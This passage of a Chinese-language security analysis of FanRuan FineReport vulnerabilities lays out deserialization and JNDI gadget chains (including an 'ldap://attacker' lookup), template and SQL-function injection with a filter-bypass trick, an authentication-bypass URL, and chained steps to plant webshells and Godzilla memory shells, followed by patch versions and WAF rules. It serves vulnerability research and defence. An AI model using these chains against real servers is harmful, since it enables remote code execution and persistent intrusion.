## 二、漏洞详细分析

### 2.1 反序列化漏洞系列

#### 2.1.1 Channel反序列化漏洞

**漏洞路径**: `/webroot/decision/remote/design/channel`

**漏洞原理**:
- 该接口接收序列化数据并直接反序列化
- 使用Hibernate利用链（`com.fr.third.org.hibernate.*`）
- 可通过TemplatesImpl加载恶意字节码

**利用方式**:
```
POST /webroot/decision/remote/design/channel
Content-Type: application/x-www-form-urlencoded

[序列化payload]
```

**利用链**:
```
hibernate1链 → TemplatesImpl.getOutputProperties() → 类加载 → RCE
```

**内存马注入**:
- 使用Java Memshell Generator生成Tomcat Filter类型内存马
- 继承AbstractTranslet适配TemplatesImpl利用
- 通过hibernate链注入哥斯拉内存马

**关键类**:
```java
com.fr.third.org.hibernate.engine.spi.TypedValue
com.fr.third.org.hibernate.type.ComponentType
com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer
```

#### 2.1.2 HSQL二次反序列化漏洞

**漏洞原理**:
1. 帆软自带HSQL数据库依赖
2. 通过DruidDataSource封装触发JNDI调用
3. HSQL的CALL命令可调用任意静态方法
4. 配合二次反序列化实现RCE

**利用方式一：JNDI注入**:
```java
// HSQL CALL命令调用JNDI
CALL "javax.naming.InitialContext.doLookup"('ldap://attacker:1389/exploit')
```

**利用方式二：二次反序列化**:
```java
// 通过CALL调用反序列化函数
CALL "org.terracotta.modules.ehcache.collections.SerializationHelper.deserialize"('[序列化数据]')
```

**新利用链构造**:
```
TextAndMnemonicHashMap.get() → key.toString()
    → JSONArray.toString() → EmbedJson.encode()
        → MAPPER.writeValueAsString() → getter调用
            → DruidDataSource.getConnection() → HSQL JNDI/RCE
```

**关键点**:
- 绕过黑名单：`java.security.SignedObject`被禁用
- 新入口：`javax.swing.UIDefaults$TextAndMnemonicHashMap`
- 组合利用：Hashtable → AbstractMap.equals → TextAndMnemonicHashMap.get

### 2.2 模板注入漏洞系列

#### 2.2.1 viewReportServer RCE漏洞

**漏洞路径**: `/webroot/decision/view/ReportServer`

**漏洞原理**:
1. `ReportRequestCompatibleService#preview`使用TemplateUtils解析查询字符串
2. 模板引擎支持调用内置函数（继承`com.fr.script.AbstractFunction`）
3. SQL函数可执行任意SQL语句
4. 默认使用SQLite数据库，存在FRDemo数据库连接

**漏洞触发**:
```java
// com.fr.web.controller.ReportRequestCompatibleService#preview
String queryString = var1.getQueryString();  // 获取URL解码前的查询字符串
TemplateUtils.render(queryString);  // 模板引擎解析
```

**SQL函数调用**:
```
${sql('FRDemo', 'SELECT * FROM users', 1, 1)}
```

**黑名单绕过**:
- 原黑名单检测：关键词匹配
- 绕过方法：SQL前添加U+FEFF字符（URL编码`%EF%BB%BF`）
- SQLite特性：执行SQL前会移除U+FEFF字符

**利用Payload**:
```
GET /webroot/decision/view/ReportServer?${sql('FRDemo',DECODE('%EF%BB%BFATTACH DATABASE...'),1,1)}
```

**修复方案**:
1. 不再对查询字符串进行模板解析
2. 改用正则匹配黑名单关键词

#### 2.2.2 LargeDatasetExcelExport SQL注入

**漏洞路径**:
- `/webroot/decision/url/nx/largeds/export` (POST)
- `/webroot/decision/url/nx/largeds/export/v9` (GET)

**关键注解**: `@LoginStatusChecker(required = false)` - 无需认证

**参数处理流程**:
```
请求 → NXController → LargeDatasetExcelExportHandler
    → initCreator() 解析参数
        → __parameters__ (JSON格式)
        → params (XML格式)
        → functionParams (JSON格式)
    → dealParam() 表达式求值
        → calculator.evalValue() ← 漏洞点
```

**漏洞触发点**:
```java
// LargeDatasetExcelExportHandler#dealParam
if (parameter.getValue() instanceof Formula) {
    linkedHashMap.put(parameter.getName(),
        calculator.evalValue(String.valueOf(parameter.getValue())));
}
```

**恶意XML构造**:
```xml
<R>
    <Parameters>
        <Parameter>
            <Attributes name="p1"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo','SELECT...',1,1)</Attributes>
            </Object>
        </Parameter>
    </Parameters>
    <LargeDatasetExcelExportJS exportFileName="test" dsName="ds1" colNames="{}"/>
</R>
```

### 2.3 鉴权绕过漏洞

**漏洞位置**: `ReportTemplateRequestChecker#checkTemplateAuthority`

**漏洞原理**:
```java
// 修复前的代码逻辑
private boolean checkTemplateAuthority(String var1, String[] var2, int var3) {
    ...
    if (var3 >= 1) {
        return this.checkTemplateAuthority("reportlets", var2, var3 - 1);
    } else {
        return false;  // 漏洞点：var3 == 0时返回false
    }
}
```

**绕过条件**:
1. 请求包含`viewlet`/`reportlet`/`formlet`/`reportlets`参数
2. 参数值为`/`或`[{'reportlet':'/'}]`
3. 路径分割后数组长度为0 → var3 == 0 → 返回false → 绕过鉴权

**绕过Payload**:
```
/webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]
```

**getSessionID流程**:
```
GroupReportletCreator.createWebletByRequest()
    → op=getSessionID时返回非空Weblet
    → SessionPoolManager.generateSessionIDWithCheckRegister()
    → 生成合法sessionId
```

### 3.2 攻击入口分析

#### 3.2.1 高危接口列表

| 接口路径 | 功能 | 认证 | 风险 |
|---------|------|------|------|
| `/decision/remote/design/channel` | 设计器通信 | 需认证 | 反序列化RCE |
| `/decision/view/ReportServer` | 报表预览 | 需认证 | 模板注入RCE |
| `/decision/view/report` | 报表视图 | 可绕过 | 鉴权绕过 |
| `/decision/nx/report/v9/largedataset/export/excel` | Excel导出 | sessionId | SQL注入RCE |
| `/decision/url/nx/largeds/export` | 大数据集导出 | 无需认证 | SQL注入 |

#### 3.2.2 攻击链组合

**组合一：鉴权绕过 + Formula注入 + SQL注入**
```
Step 1: 获取sessionId
GET /webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]

Step 2: Formula表达式注入
POST /webroot/decision/nx/report/v9/largedataset/export/excel
Header: sessionID: [sessionId]
Body: params=<XML with Formula>...

Step 3: SQL注入 → Webshell落地
sql('FRDemo', 'VACUUM INTO ...', 1, 1)
```

**组合二：反序列化 + 内存马**
```
Step 1: 生成内存马字节码
Java Memshell Generator → Tomcat Filter类型

Step 2: 构造hibernate利用链
hibernate1链 + TemplatesImpl → 序列化payload

Step 3: 发送payload
POST /webroot/decision/remote/design/channel
[序列化数据]

Step 4: 连接内存马
哥斯拉连接 Filter内存马路径
```

### 3.3 核心组件风险点

#### 3.3.1 表达式解析器

**位置**: `com.fr.script.Calculator`

**风险**:
- `evalValue()`直接执行用户可控表达式
- 支持调用内置函数（SQL、EVAL等）
- 未对可调用函数进行权限控制

**相关函数**:
```java
com.fr.function.SQL        // 执行SQL语句
com.fr.function.EVAL       // 执行表达式
com.fr.function.DECODE     // URL解码
```

#### 3.3.2 XML解析器

**位置**: `com.fr.general.xml.GeneralXMLTools`

**风险**:
- 支持实例化指定类型对象
- `<Object t="Formula">`可创建Formula对象
- 可通过XML注入任意表达式

#### 3.3.3 数据库安全检查器

**位置**: `com.fr.cbb.dialect.security.JDBCSecurityChecker`

**绕过历史**:
| 版本 | 黑名单 | 绕过方法 |
|------|--------|---------|
| 早期 | 基础关键词 | 直接注入 |
| 中期 | 扩展关键词 | U+FEFF绕过 |
| 新版 | 正则匹配 | VACUUM/PRAGMA利用 |

## 五、安全建议

### 5.1 官方修复建议

1. **及时升级**: 升级到最新安全版本
   - FineReport >= 11.5.4.1
   - FineBI >= 7.0.5
   - FineDataLink >= 5.0.4.3

2. **应用补丁**:
   - 下载地址: https://help.fanruan.com/finereport/doc-view-4658.html

### 5.2 临时缓解措施

#### 5.2.1 网络层面

```
WAF规则:
1. 检测序列化特征: ac ed 00 05 (Java序列化魔术字节)
2. 检测表达式特征: ${...}, #{...}
3. 检测XML注入: <Object t="Formula">
4. 检测SQL关键词: VACUUM, PRAGMA, ATTACH
```

#### 5.2.2 应用层面

```
1. 禁用高危接口:
   - /decision/remote/design/channel
   - /decision/view/ReportServer

2. 加强认证:
   - 启用双因素认证
   - 限制设计器远程访问

3. 数据库安全:
   - 迁移SQLite到其他数据库
   - 限制数据库连接权限
```

### 5.3 深度防护建议

1. **输入验证**: 使用白名单验证，而非黑名单过滤

2. **表达式沙箱**: 限制Calculator可调用的函数范围

3. **权限分离**: 数据库连接使用最小权限原则

4. **日志审计**: 记录所有敏感操作，便于入侵检测

5. **内存马检测**: 定期扫描Filter/Servlet/Listener列表

## 六、总结

### 6.1 漏洞特点分析

帆软报表的历史漏洞具有以下特点:

1. **攻击面广**: 反序列化、表达式注入、SQL注入、鉴权绕过
2. **利用链成熟**: 多个漏洞可组合利用
3. **绕过技巧多样**: 黑名单绕过、编码绕过、特性利用
4. **危害严重**: 多数漏洞可导致RCE

### 6.2 关键风险点

| 风险点 | 位置 | 影响 |
|--------|------|------|
| 表达式解析器 | Calculator | 可执行任意函数 |
| XML解析器 | GeneralXMLTools | 可实例化任意对象 |
| SQL函数 | com.fr.function.SQL | 可执行任意SQL |
| 鉴权检查 | ReportTemplateRequestChecker | 存在边界绕过 |

### 6.3 后续挖掘方向

1. **新版本特性分析**: 关注新功能的代码实现
2. **插件生态审计**: 审计第三方插件的安全性
3. **协议层攻击**: WebSocket、RPC等协议的安全性
4. **逻辑漏洞挖掘**: 业务逻辑层面的缺陷
